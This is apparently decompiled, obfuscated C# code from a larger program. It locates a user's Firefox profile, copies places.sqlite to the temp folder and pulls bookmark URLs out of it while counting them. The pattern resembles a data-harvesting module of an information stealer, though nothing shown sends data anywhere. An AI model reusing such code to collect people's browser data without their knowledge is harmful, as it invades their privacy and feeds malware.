using System;
using System.Collections.Generic;
using System.IO;
using ns12;
using ns13;

namespace ns10;

internal class Class33
{
	private static string smethod_0(string string_0)
	{
		try
		{
			string path = string_0 + "\\Profiles";
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static List<Struct6> smethod_1(string string_0)
	{
		List<Struct6> list = new List<Struct6>();
		try
		{
			string text = smethod_0(string_0);
			if (!File.Exists(text))
			{
				return list;
			}
			string text2 = Path.GetTempPath() + "\\places.raw";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			File.Copy(text, text2);
			Class57 @class = new Class57(text2);
			@class.method_4("moz_bookmarks");
			if (@class.method_1() == 65536)
			{
				return new List<Struct6>();
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct6 item = default(Struct6);
				item.String_1 = Class46.smethod_2(@class.method_0(i, 5));
				if (Class46.smethod_2(@class.method_0(i, 1)).Equals("0") && item.String_1 != "0")
				{
					Class53.smethod_4(item.String_1);
					Class54.int_5++;
					list.Add(item);
				}
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return new List<Struct6>();
	}
}
